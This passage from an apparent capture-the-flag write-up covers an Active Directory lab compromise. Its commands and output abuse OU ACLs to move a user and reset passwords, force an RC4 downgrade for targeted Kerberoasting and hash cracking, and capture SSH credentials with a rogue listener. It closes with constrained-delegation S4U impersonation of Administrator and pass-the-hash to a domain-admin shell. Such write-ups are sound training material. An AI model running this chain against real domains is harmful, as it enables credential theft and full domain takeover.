⠀⠀⠀⠀⠀⠀⠈⢿⣏⢉⣽⣉⠹⣌⣿⣻⣶⣾⣟⣻⣿⣿⣿⡿⣽⠀⣣⠹⡌⣿⣲⣬⡥⣾⣿⣿⣿⣿⣿⣿⣿⣿⡷⣿
⠀⠀⠀⠀⠀⠀⠀⠈⢿⡚⠛⢿⠓⠿⣏⢻⣿⣿⣿⣿⣿⣿⣿⣿⡞⠳⡗⣶⢿⡉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⡞⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠾⠦⠷⠤⠼⠿⠯⠭⠿⠿⠿⠿⠽⠿⠿⠶⠤⠧⠤⠿⠧⠤⠼⠧⠤⠼⠤⠼⠧⠤⠿⠋⠀⠀

```

---

## 10. OU ACL Analysis & Object Move Attack

Dumping ACLs on the four IT-Tier OUs:

```
for tier in 1 2 3 4; do
  echo "=== IT-Tier$tier ==="
  bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k \
    get object "OU=IT-Tier$tier,DC=hsm-defense,DC=local" --attr nTSecurityDescriptor --resolve-sd
done
```

**Findings:**

| OU | caleb.turner / IT OU Operators rights | Deny ACEs |
|---|---|---|
| IT-Tier1 | caleb.turner has `DELETE_CHILD` only | None |
| IT-Tier2 | `GenericAll` with CONTAINER_INHERIT | `CREATE_CHILD` (User) + `WRITE_PROP` |
| **IT-Tier3** | **`GenericAll` with CONTAINER_INHERIT** | **None** |
| IT-Tier4 | `GenericAll` with CONTAINER_INHERIT | `CREATE_CHILD` (User) |

**IT-Tier3 is the target** — full control with no Deny ACEs.

### Move oscar.mazerath from IT-Tier1 to IT-Tier3

Moving an AD object requires **DELETE_CHILD** on the source OU and **CREATE_CHILD** on the destination OU. We have both:

```
bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k \
  set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' \
  distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
```

Once in IT-Tier3, the CONTAINER_INHERIT GenericAll ACE grants us full control.

### Reset oscar.mazerath's Password

```
bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k \
  set password oscar.mazerath 'Pwned123@!'
```

Authenticate:

```
nxc smb -k DC.hsm-defense.local -u oscar.mazerath -p 'Pwned123@!' --shares
```

---

## 11. Targeted Kerberoasting on ryan.cole

`oscar.mazerath` holds **GenericWrite** over `ryan.cole`. We perform a Targeted Kerberoast:

```
targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' \
  -d 'hsm-defense.local' --request-user 'ryan.cole'
```

The resulting blob is too strong to crack (AES). We downgrade the encryption types:

```
bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k \
  set object ryan.cole msDS-SupportedEncryptionTypes -v 4
```

This forces **RC4** encryption. Re-run the attack:

```
targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' \
  -d 'hsm-defense.local' --request-user 'ryan.cole'
hashcat -m 13100 -a 0 cole.hash /usr/share/wordlists/rockyou.txt
```

Authenticate as `ryan.cole`:

```
nxc smb -k DC.hsm-defense.local -u ryan.cole -p 'REDACTED' --shares
```

---

## 12. RDP Shell as ryan.cole — SSH Tool Discovery

```
getTGT.py hsm-defense.local/ryan.cole:'REDACTED'
export KRB5CCNAME=$(pwd)/ryan.cole.ccache
xfreerdp /v:DC.hsm-defense.local /d:HSM-DEFENSE.LOCAL /u:ryan.cole \
  /dynamic-resolution +clipboard /cert:ignore
```

On the desktop, we find an email referencing an internal **SSH Remote Tool** for legacy systems, plus a shortcut to the application.

---

## 13. Capturing ITOPS01$ Credentials

The SSH tool connects to legacy systems using unencrypted SSH. We launch **SSHlog**, a credential-capturing SSH server, on our attacker machine:

```
./SSHlog
```

Pointing the SSH tool at our listener, we capture cleartext credentials for the machine account **ITOPS01$**.

Authenticate:

```
nxc smb -k DC.hsm-defense.local -u 'ITOPS01$' -p 'REDACTED' --shares
```

---

## 14. Access as svc_delegate

`ITOPS01$` holds **WriteDACL** over `svc_delegate`. We grant ourselves FullControl:

```
getTGT.py hsm-defense.local/'ITOPS01$:REDACTED'
export KRB5CCNAME=$(pwd)/ITOPS01$.ccache

bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  add genericAll svc_delegate ITOPS01$
```

Reset the password:

```
bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  set password 'svc_delegate' 'Pwned123@!'
```

Authenticate:

```
nxc smb -k DC.hsm-defense.local -u 'svc_delegate' -p 'Pwned123@!' --shares
```

---

## 15. Constrained Delegation → DCSync → Domain Admin

`svc_delegate` has **GenericWrite** on `HELPDESK01$`. This allows us to configure **Kerberos Constrained Delegation with Protocol Transition** on the machine account.

### Why the Machine Account?

The S4U2Self delegation step requires a **Service Principal Name (SPN)**. Machine accounts have SPNs by default, making `HELPDESK01$` the ideal target.

### Configure Constrained Delegation

Set `msDS-AllowedToDelegateTo` to `ldap/DC.hsm-defense.local` and enable the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag:

```bash
bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  set object HELPDESK01$ msDS-AllowedToDelegateTo -v "ldap/DC.hsm-defense.local"

bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  set object HELPDESK01$ userAccountControl -v 16781312
```

### Impersonate Administrator via S4U

Using `getST.py`, we perform S4U2Self and S4U2Proxy:

```
getST.py -spn ldap/DC.hsm-defense.local -impersonate Administrator \
  -dc-ip 10.1.87.19 'hsm-defense.local/HELPDESK01$:REDACTED'
```

### Pass-the-Hash

```
getTGT.py -hashes :<NTLM_HASH> hsm-defense.local/Administrator
export KRB5CCNAME=$(pwd)/Administrator.ccache

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ nxc smb 10.1.212.125 -u Administrator k --use-kcache -X 'cat C:\Users\Administrator\Desktop\root.txt'
SMB         10.1.212.125    445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.1.212.125    445    DC               [+] hsm-defense.local\Administrator from ccache (Pwn3d!)
SMB         10.1.212.125    445    DC               [+] Executed command via wmiexec
SMB         10.1.212.125    445    DC               #< CLIXML
SMB         10.1.212.125    445    DC               FLAG[$FLAG]

```

**Root flag captured.** ✅

---

## Attack Chain Summary

```
Phishing (ODT) → Responder → kelly.johnson
    ↓
BloodHound → Support Portal → Ticket 2417 (HELPDESK01$ manual password)
    ↓
Timeroast → Crack HELPDESK01$ → WriteOwner on servicedesk
    ↓
GenericAll → AddMember → ForceChangePassword on jason.caldwell / luke.harrison
    ↓
luke.harrison → WriteProperty on jason.caldwell logonHours → Clear restriction
    ↓
jason.caldwell → WinRM → MariaDB creds → Crack MD5 → Spray → caleb.turner
    ↓
caleb.turner → IT OU Operators → Move oscar.mazerath (IT-Tier1 → IT-Tier3) → Full control
    ↓
oscar.mazerath → Targeted Kerberoast (RC4 downgrade) → Crack → ryan.cole
    ↓
ryan.cole → RDP → SSH Tool → SSHlog → Capture ITOPS01$ creds
    ↓
ITOPS01$ → WriteDACL on svc_delegate → GenericAll → Reset password
    ↓
svc_delegate → GenericWrite on HELPDESK01$ → Constrained Delegation (S4U)
    ↓
DCSync → Administrator NTLM → Pass-the-Hash → Domain Admin ✅
```
